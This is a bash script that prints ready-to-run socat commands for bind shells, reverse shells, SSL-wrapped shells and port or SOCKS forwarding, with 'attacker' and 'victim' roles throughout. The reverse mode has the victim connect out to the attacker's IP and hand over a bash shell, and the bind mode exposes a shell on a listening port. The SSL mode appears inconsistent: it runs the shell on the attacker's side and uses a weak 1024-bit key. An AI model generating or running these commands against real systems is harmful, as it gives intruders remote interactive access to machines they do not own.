#!/bin/bash
# Socat Tunnel Quick Setup
# Usage: ./socat-tunnel.sh <type> [options]

set -e

show_help() {
    cat << 'EOF'
Socat Tunnel Quick Setup

Usage: ./socat-tunnel.sh <type> [options]

Types:
  bind        - Bind shell (victim listens)
  reverse     - Reverse shell (attacker listens)
  forward     - Port forwarding
  ssl         - SSL-encrypted tunnel
  socks       - Port forward through SOCKS

Examples:
  ./socat-tunnel.sh bind -v 10.0.0.1 -p 1337
  ./socat-tunnel.sh reverse -a 10.0.0.2 -p 1337
  ./socat-tunnel.sh forward -l 8080 -t 10.0.0.1 -p 80
  ./socat-tunnel.sh ssl -a 10.0.0.2 -p 443 -c ./cert.pem

Options:
  -a, --attacker    Attacker IP
  -v, --victim      Victim IP
  -l, --local       Local port
  -t, --target      Target IP (for forward)
  -p, --port        Port number
  -c, --cert        Certificate file (for SSL)
  -e, --exec        Command to execute (default: bash)
EOF
}

generate_bind() {
    local victim="" port="1337" exec="bash"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -v|--victim) victim="$2"; shift 2 ;;
            -p|--port) port="$2"; shift 2 ;;
            -e|--exec) exec="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
    
    [[ -z "$victim" ]] && { echo "Error: Missing victim IP"; show_help; exit 1; }
    
    echo "# Bind Shell"
    echo "# Victim listens, attacker connects"
    echo ""
    echo "# On victim ($victim):"
    echo "socat TCP-LISTEN:$port,reuseaddr,fork EXEC:$exec,pty,stderr,setsid,sigint,sane"
    echo ""
    echo "# On attacker:"
    echo "socat FILE:\`tty\`,raw,echo=0 TCP4:$victim:$port"
}

generate_reverse() {
    local attacker="" port="1337" exec="bash"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -a|--attacker) attacker="$2"; shift 2 ;;
            -p|--port) port="$2"; shift 2 ;;
            -e|--exec) exec="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
    
    [[ -z "$attacker" ]] && { echo "Error: Missing attacker IP"; show_help; exit 1; }
    
    echo "# Reverse Shell"
    echo "# Attacker listens, victim connects"
    echo ""
    echo "# On attacker:"
    echo "socat TCP-LISTEN:$port,reuseaddr FILE:\`tty\`,raw,echo=0"
    echo ""
    echo "# On victim:"
    echo "socat TCP4:$attacker:$port EXEC:$exec,pty,stderr,setsid,sigint,sane"
}

generate_forward() {
    local local_port="" target_ip="" target_port=""
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -l|--local) local_port="$2"; shift 2 ;;
            -t|--target) target_ip="$2"; shift 2 ;;
            -p|--port) target_port="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
    
    [[ -z "$local_port" || -z "$target_ip" || -z "$target_port" ]] && \
        { echo "Error: Missing required options"; show_help; exit 1; }
    
    echo "# Port Forwarding"
    echo "# Forward local port $local_port to $target_ip:$target_port"
    echo ""
    echo "socat TCP4-LISTEN:$local_port,fork TCP4:$target_ip:$target_port &"
    echo ""
    echo "# Access via: curl http://localhost:$local_port"
}

generate_ssl() {
    local attacker="" port="443" cert="" victim=""
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -a|--attacker) attacker="$2"; shift 2 ;;
            -v|--victim) victim="$2"; shift 2 ;;
            -p|--port) port="$2"; shift 2 ;;
            -c|--cert) cert="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
    
    [[ -z "$attacker" || -z "$cert" ]] && { echo "Error: Missing required options"; show_help; exit 1; }
    
    echo "# SSL-Encrypted Tunnel"
    echo ""
    echo "# Generate certificates first (both sides):"
    echo "FILENAME=socatssl"
    echo "openssl genrsa -out \$FILENAME.key 1024"
    echo "openssl req -new -key \$FILENAME.key -x509 -days 3653 -out \$FILENAME.crt"
    echo "cat \$FILENAME.key \$FILENAME.crt >\$FILENAME.pem"
    echo "chmod 600 \$FILENAME.key \$FILENAME.pem"
    echo ""
    echo "# On attacker:"
    echo "socat OPENSSL-LISTEN:$port,reuseaddr,cert=$cert,cafile=client.crt EXEC:/bin/sh"
    echo ""
    echo "# On victim:"
    echo "socat STDIO OPENSSL-CONNECT:$attacker:$port,cert=client.pem,cafile=server.crt"
}

generate_socks() {
    local local_port="1234" target_host="google.com" target_port="80" socks_host="127.0.0.1" socks_port="5678"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -l|--local) local_port="$2"; shift 2 ;;
            -t|--target) target_host="$2"; shift 2 ;;
            -p|--port) target_port="$2"; shift 2 ;;
            -s|--socks-host) socks_host="$2"; shift 2 ;;
            -S|--socks-port) socks_port="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
    
    echo "# Port Forwarding Through SOCKS"
    echo "# Forward $target_host:$target_port through SOCKS proxy at $socks_host:$socks_port"
    echo ""
    echo "socat TCP4-LISTEN:$local_port,fork SOCKS4A:$socks_host:$target_host:$target_port,socksport=$socks_port"
    echo ""
    echo "# Access via: curl http://localhost:$local_port"
}

# Main
case "${1:-}" in
    bind) shift; generate_bind "$@" ;;
    reverse) shift; generate_reverse "$@" ;;
    forward) shift; generate_forward "$@" ;;
    ssl) shift; generate_ssl "$@" ;;
    socks) shift; generate_socks "$@" ;;
    help|-h|--help) show_help ;;
    *) echo "Unknown type: $1"; show_help; exit 1 ;;
esac
